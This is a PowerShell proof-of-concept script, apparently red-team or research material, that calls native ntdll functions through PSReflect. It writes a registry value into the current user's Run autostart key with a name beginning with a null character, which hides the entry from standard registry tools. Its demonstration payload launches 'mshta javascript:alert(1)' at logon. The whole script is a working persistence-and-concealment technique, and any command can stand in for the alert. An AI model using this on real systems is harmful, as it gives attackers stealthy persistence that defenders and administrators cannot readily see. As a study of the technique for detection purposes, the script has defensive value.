# requires PSReflect.ps1 to be in the same directory as this script
. .\PSReflect.ps1

$Module = New-InMemoryModule -ModuleName RegHide
# Define our structs. 

# https://msdn.microsoft.com/en-us/library/windows/hardware/ff564879(v=vs.85).aspx
# typedef struct _UNICODE_STRING {
#  USHORT Length;
#  USHORT MaximumLength;
#  PWSTR  Buffer;
# }
$UNICODE_STRING = struct $Module UNICODE_STRING @{
   Length        = field 0 UInt16
   MaximumLength = field 1 UInt16
   Buffer        = field 2 IntPtr
}

$OBJECT_ATTRIBUTES = struct $Module OBJECT_ATTRIBUTES @{
   Length                   = field 0 UInt32
   RootDirectory            = field 1 IntPtr
   ObjectName               = field 2 IntPtr
   Attributes               = field 3 UInt32
   SecurityDescriptor       = field 4 IntPtr
   SecurityQualityOfService = field 5 IntPtr
}

# ACCESS_MASK enum used to determine key permissions, used by NtOpenKey.
$KEY_ACCESS = psenum $Module KEY_ACCESS UInt32 @{
   KEY_QUERY_VALUE        = 0x0001
   KEY_SET_VALUE          = 0x0002
   KEY_CREATE_SUB_KEY     = 0x0004
   KEY_ENUMERATE_SUB_KEYS = 0x0008
   KEY_NOTIFY             = 0x0010
   KEY_CREATE_LINK        = 0x0020
   KEY_WOW64_64KEY        = 0x0100
   KEY_WOW64_32KEY        = 0x0200
   KEY_WRITE              = 0x20006
   KEY_READ               = 0x20019
   KEY_EXECUTE            = 0x20019
   KEY_ALL_ACCESS         = 0xF003F
} -Bitfield

# ATTRIBUTES enum passed to an OBJECT_ATTRIBUTES struct.
$OBJ_ATTRIBUTE = psenum $Module OBJ_ATTRIBUTE UInt32 @{
    OBJ_INHERIT            = 0x00000002
    OBJ_PERMANENT          = 0x00000010
    OBJ_EXCLUSIVE          = 0x00000020
    OBJ_CASE_INSENSITIVE   = 0x00000040
    OBJ_OPENIF             = 0x00000080
    OBJ_OPENLINK           = 0x00000100
    OBJ_KERNEL_HANDLE      = 0x00000200
    OBJ_FORCE_ACCESS_CHECK = 0x00000400
    OBJ_VALID_ATTRIBUTES   = 0x000007f2
} -Bitfield


# Function definitions, including parameters and Entrypoint names
$FunctionDefinitions = @(
  (func ntdll NtOpenKey ([UInt32]) @(
        [IntPtr].MakeByRefType(),           #_Out_ PHANDLE KeyHandle,
        [Int32],                            #_In_  ACCESS_MASK        DesiredAccess,
        $OBJECT_ATTRIBUTES.MakeByRefType()  #_In_  POBJECT_ATTRIBUTES ObjectAttributes
  ) -EntryPoint NtOpenKey),

  (func ntdll NtSetValueKey ([UInt32]) @(
       [IntPtr],                        #_In_     HANDLE          KeyHandle,
       $UNICODE_STRING.MakeByRefType(), #_In_     PUNICODE_STRING ValueName,
       [Int32],                         #_In_opt_ ULONG           TitleIndex,
       [Int32],                         #_In_     ULONG           Type,
       [IntPtr],                        #_In_opt_ PVOID           Data,
       [Int32]                          #_In_     ULONG           DataSize
   ) -EntryPoint NtSetValueKey),

   (func ntdll NtDeleteValueKey ([UInt32]) @(
        [IntPtr],                           #_In_ HANDLE KeyHandle,
        $UNICODE_STRING.MakeByRefType()     #_In_ PUNICODE_STRING ValueName
   ) -EntryPoint NtDeleteValueKey),

   (func ntdll NtClose ([UInt32]) @(
       [IntPtr] #_In_      HANDLE          ObjectHandle
   ) -EntryPoint NtClose),

  (func ntdll RtlInitUnicodeString ([void]) @(
       $UNICODE_STRING.MakeByRefType(), #_Inout_  PUNICODE_STRING DestinationString
       [string]                         #_In_opt_ PCWSTR          SourceString
   ) -EntryPoint RtlInitUnicodeString)
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace RegHide
$ntdll = $Types['ntdll']


$KeyHandle = [IntPtr]::Zero
$DesiredAccess = $KEY_ACCESS::KEY_ALL_ACCESS

# To open the Current User’s registry hive, we need the user’s SID
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
$KeyName = "\Registry\User\$SID\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# We'll have to convert the KeyName from PowerShell string into a UNICODE_STRING
$KeyBuffer = [Activator]::CreateInstance($UNICODE_STRING)
$ntdll::RtlInitUnicodeString([ref]$KeyBuffer, $KeyName)

# Create our OBJECT_ATTRIBUTES structure
# We don’t have the InitializeObjectAttributes macro, but we can do it manually
$ObjectAttributes = [Activator]::CreateInstance($OBJECT_ATTRIBUTES)
$ObjectAttributes.Length         = $OBJECT_ATTRIBUTES::GetSize()
$ObjectAttributes.RootDirectory  = [IntPtr]::Zero
$ObjectAttributes.Attributes     = $OBJ_ATTRIBUTE::OBJ_CASE_INSENSITIVE

# Here, we need a pointer to the UNICODE_STRING we created previously.
$ObjectAttributes.ObjectName     = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UNICODE_STRING::GetSize())
[System.Runtime.InteropServices.Marshal]::StructureToPtr($KeyBuffer, $ObjectAttributes.ObjectName, $true)

# These are set to NULL for default Security Settings (mirrors the InitializeObjectAttributes macro).
$ObjectAttributes.SecurityDescriptor       = [IntPtr]::Zero
$ObjectAttributes.SecurityQualityOfService = [IntPtr]::Zero

$status = $ntdll::NtOpenKey([ref]$KeyHandle, $DesiredAccess, [ref]$ObjectAttributes)
"OpenKey status: 0x{0:x8}" -f $status

# Next, let's create our hidden value key and its data
# Our hidden value key name will be "\0abcd" and its data will be an alert box that triggers
# Note that the Null character in PowerShell is `0
$ValueName = "`0abcd"
$ValueData = "mshta javascript:alert(1)"
$ValueNameBuffer = [Activator]::CreateInstance($UNICODE_STRING)
$ValueDataBuffer = [Activator]::CreateInstance($UNICODE_STRING)

# Since RtlInitUnicodeString takes in a null-terminated string (and won't return the correct name),
# we'll have to manually create the ValueName UNICODE_STRING.
# Allocate enough space for 2-byte wide characters
$ValueNameBuffer.Length        = $ValueName.Length * 2
$ValueNameBuffer.MaximumLength = $ValueName.Length * 2
$ValueNameBuffer.Buffer        = [System.Runtime.InteropServices.Marshal]::StringToCoTaskMemUni($ValueName)

# ValueData doesn't have any `0 characters, so we're good to use RtlInitUnicodeString
$ntdll::RtlInitUnicodeString([ref]$ValueDataBuffer, $ValueData)

# Fill out the remaining parameters for NtSetValueKey
$ValueType  = 0x00000001 # REG_SZ Value Type
# "Device and intermediate drivers should set TitleIndex to zero."
$TitleIndex = 0

$status = $ntdll::NtSetValueKey($KeyHandle, [ref]$ValueNameBuffer, $TitleIndex, $ValueType, $ValueDataBuffer.Buffer, $ValueDataBuffer.Length)
"SetValueKey status: 0x{0:x8}" -f $status

# uncomment these lines to clean up your registry key
# $status = $ntdll::NtDeleteValueKey($KeyHandle, [ref]$ValueNameBuffer)
# "DeleteValueKey status: 0x{0:x8}" -f $status

# Free the memory allocated after using AllocHGlobal
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ObjectAttributes.ObjectName)

# Close the handle to the key to clean up after we're done
$status = $ntdll::NtClose($KeyHandle)
"CloseKey status: 0x{0:x8}" -f $status
